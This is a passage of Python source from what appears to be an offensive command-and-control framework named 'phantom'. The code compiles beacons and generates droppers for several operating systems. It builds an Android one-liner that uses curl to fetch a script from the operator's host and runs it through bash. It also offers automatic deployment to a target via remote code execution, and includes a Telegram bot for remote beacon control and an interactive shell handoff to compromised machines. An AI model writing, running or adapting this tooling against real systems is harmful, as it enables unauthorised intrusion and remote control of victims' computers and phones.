        from phantom.utils.network import get_lhost
        from phantom.core.session import session
        
        parts = arg.strip().split()
        malleable_profile = None
        
        # Parse --profile flag
        for i, p in enumerate(parts):
            if p == "--profile" and i + 1 < len(parts):
                malleable_profile = parts[i + 1]
                parts.pop(i)      # remove --profile
                parts.pop(i)      # remove the path
                break
        
        platform = parts[0].lower() if parts else ""
        arch = parts[1].lower() if len(parts) > 1 else ""

        if not platform:
            # Check scan results for OS clues
            scan_res = session.get_result("scan") or {}
            all_text = str(scan_res).lower()
            if "linux" in all_text or "unix" in all_text:
                platform = "linux"
                notifier.info("Detected Linux target from scan results. Defaulting to 'linux'.")
            elif "windows" in all_text:
                platform = "windows"
                notifier.info("Detected Windows target from scan results. Defaulting to 'windows'.")
            else:
                import sys
                valid_platforms_local = ["windows", "linux", "macos", "android"]
                if sys.stdin.isatty():
                    try:
                        from phantom.utils.interactive import select_option
                        choice = select_option("No platform detected. Select platform:", valid_platforms_local, default_index=0)
                    except Exception:
                        choice = None

                    if choice:
                        platform = choice
                    else:
                        notifier.warn("No platform selected; aborting generation.")
                        return
                else:
                    notifier.warn("No platform detected and non-interactive session. Defaulting to 'windows'.")
                    platform = "windows"
        
        valid_platforms = ["windows", "linux", "macos", "android"]
        if platform not in valid_platforms:
            notifier.error(f"Invalid platform. Choose from: {', '.join(valid_platforms)}")
            return
            
        # Architecture selection
        if not arch:
            if platform in ["linux", "windows"]:
                import sys
                if sys.stdin.isatty():
                    try:
                        from phantom.utils.interactive import select_option
                        arch = select_option(f"Select architecture for {platform}:", ["x64", "x86"], default_index=0)
                    except Exception:
                        arch = "x64"
                else:
                    arch = "x64"
            else:
                arch = "x64"
        
        from phantom.utils.builder import compile_beacon, generate_dropper
        from phantom.utils.payload_manager import add_custom_beacon

        import phantom
        pkg_root = os.path.dirname(phantom.__file__)
        host = session.lhost or get_lhost()
        port = int(session.lport) or (server_instance.port if (server_instance.thread and server_instance.thread.is_alive()) else 8080)
        use_ssl = server_instance.use_ssl if (server_instance.thread and server_instance.thread.is_alive()) else True
        
        # Compile and generate dropper
        try:
            beacon_path = compile_beacon(platform, pkg_root, force_rebuild=True, arch=arch,
                                          host=host, port=port, use_ssl=use_ssl,
                                          malleable_profile=malleable_profile)
        except Exception as e:
            notifier.error(f"Compilation process crashed: {e}")
            return
            
        if not beacon_path:
            return
        if not (server_instance.thread and server_instance.thread.is_alive()):
            notifier.warn(f"Listener not active. Run: listeners start {port}")

        dropper = generate_dropper(platform, host, port, arch=arch, use_ssl=use_ssl)
        if not dropper:
            notifier.error(f"Failed to generate dropper for {platform}")
            return

        # Show short one-liner for Android (user types it manually on phone)
        if platform == "android":
            proto = "https" if use_ssl else "http"
            from phantom.utils.c2_crypto import get_payload_token
            token = get_payload_token()
            dollar = "$"
            dropper = f"bash -c \"{dollar}(curl -sk '{proto}://{host}:{port}/s/android?auth={token}')\""

        # Display and Register
        title_map = {
            "windows": "PowerShell Dropper (Windows)",
            "linux": "Bash Dropper (Linux)",
            "macos": "Bash Dropper (macOS)",
            "android": "ADB Dropper (Android)"
        }
        style_map = {
            "windows": "green",
            "linux": "cyan",
            "macos": "yellow",
            "android": "red"
        }

        console.print(Panel(dropper, title=f"[bold {style_map.get(platform, 'white')}]{title_map.get(platform, 'Dropper')} ({arch})[/]", border_style=style_map.get(platform, "white")))
        add_custom_beacon(platform, dropper, f"Custom C++ Beacon ({arch})", source="c2_shell")

        # Ask for automatic deployment
        if session.target:
            console.print()
            deploy_choice = input(f"[?] Deploy to {session.target} now? [y/N]: ").strip().lower()
            
            if deploy_choice == 'y':
                from phantom.utils.rce_deployer import deploy_beacon
                console.print("\n[*] Initiating intelligent RCE deployment...")
                success = deploy_beacon(session.target, dropper)
                
                if success:
                    notifier.success(f"Beacon deployed to {session.target}. Check beacons list.")
                    # Give time for beacon to callback
                    import time
                    time.sleep(2)
                else:
                    notifier.warn("Deployment via RCE failed. Copy command manually or try another method.")
            else:
                notifier.info("Beacon command ready. Run it manually on the target.")
        else:
            notifier.info("No target set. Run the command manually or set target first with 'set target <ip>'")

    def do_telegram(self, arg):
        """telegram — Avvia il bot Telegram per gestire beacon da mobile"""
        try:
            from phantom.modules.telegram import run
            run()
            notifier.success("Telegram bot avviato in background. /start su @your_bot")
        except Exception as e:
            notifier.error(f"Telegram bot: {e}")

    def do_exit(self, arg):
        """exit - Close C2 and return to main Phantom CLI (or exit completely)"""
        console.print("[dim]Stopping listener...[/]")
        server_instance.stop()
        return True

    def do_quit(self, arg):
        return self.do_exit(arg)

def run_c2(preferred_beacon: Optional[str] = None):
    """Start the interactive C2 shell.

    With preferred_beacon (handoff from auto-mode) the operator lands
    DIRECTLY in that beacon's terminal: every command typed is queued to
    the beacon and the result is fetched — the operator inspects the box
    and does the cleanup manually. 'back' returns to the global C2
    context.
    """
    try:
        shell = C2Shell()
        if preferred_beacon:
            resolved = _resolve_beacon_id(preferred_beacon)
            if resolved:
                shell.active_beacon = resolved
                notifier.success(
                    f"Handoff: sessione beacon attiva ({resolved})")
                notifier.info("Comandi digitati -> beacon. "
                              "'beacon-help' per i comandi, "
                              "'back' per tornare al C2 globale.")
            else:
                notifier.warn(
                    f"Beacon {preferred_beacon} non trovato. "
                    "Usa 'beacons' e 'interact <id>'.")
        # Telegram is opt-in: start it explicitly with `telegram`.
        # Entering C2 must not spawn background services or emit configuration alerts.
        shell.cmdloop()
    except KeyboardInterrupt:
        print()
        server_instance.stop()
